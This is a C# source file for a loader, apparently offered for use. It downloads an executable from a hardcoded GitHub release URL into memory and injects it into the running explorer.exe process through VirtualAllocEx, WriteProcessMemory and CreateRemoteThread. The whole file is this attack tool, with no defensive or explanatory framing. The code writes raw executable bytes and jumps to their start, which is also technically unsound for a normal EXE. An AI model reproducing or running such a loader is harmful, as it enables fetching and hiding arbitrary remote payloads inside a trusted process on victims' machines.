using System;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

public class RunPELoader
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Execute(byte[] exeBytes)
    {
        uint pid = 0;
        Process[] processes = Process.GetProcessesByName("explorer");

        if (processes.Length == 0)
        {
            Console.WriteLine("No running process found.");
            return;
        }

        pid = (uint)processes[0].Id; // Use explorer process to inject into

        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, pid);

        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open target process.");
            return;
        }

        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)exeBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (allocatedMemory == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory in target process.");
            return;
        }

        uint bytesWritten = 0;
        WriteProcessMemory(hProcess, allocatedMemory, exeBytes, (uint)exeBytes.Length, ref bytesWritten);

        if (bytesWritten == 0)
        {
            Console.WriteLine("Failed to write memory in target process.");
            return;
        }

        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, ref pid);

        if (remoteThread == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create remote thread.");
            return;
        }

        WaitForSingleObject(remoteThread, 0xFFFFFFFF);

        CloseHandle(hProcess);
        CloseHandle(remoteThread);

        Console.WriteLine("Execution completed.");
    }

    public static byte[] DownloadExeToMemory(string url)
    {
        using (WebClient client = new WebClient())
        {
            return client.DownloadData(url);
        }
    }

    public static void Main(string[] args)
    {
        string url = "https://github.com/scinne/cppinjection/releases/download/test/578d2bfa.exe";  // Update with your actual URL
        byte[] exeBytes = DownloadExeToMemory(url);
        Execute(exeBytes);
    }
}
